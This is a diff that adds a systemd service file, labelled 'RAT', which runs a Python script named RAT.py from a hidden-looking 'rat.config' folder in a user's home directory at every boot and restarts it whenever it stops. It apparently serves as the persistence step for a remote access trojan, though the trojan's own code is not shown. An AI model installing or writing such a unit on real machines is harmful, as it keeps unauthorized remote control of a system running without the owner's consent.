@@ -1,0 +1,12 @@
+[Unit]
+Description=RAT
+After=multi-user.target
+
+[Service]
+Type=simple
+Restart=always
+ExecStart=/usr/bin/python3 /home/<username>/rat.config/RAT.py
+WorkingDirectory=~
+
+[Install]
+WantedBy=multi-user.target
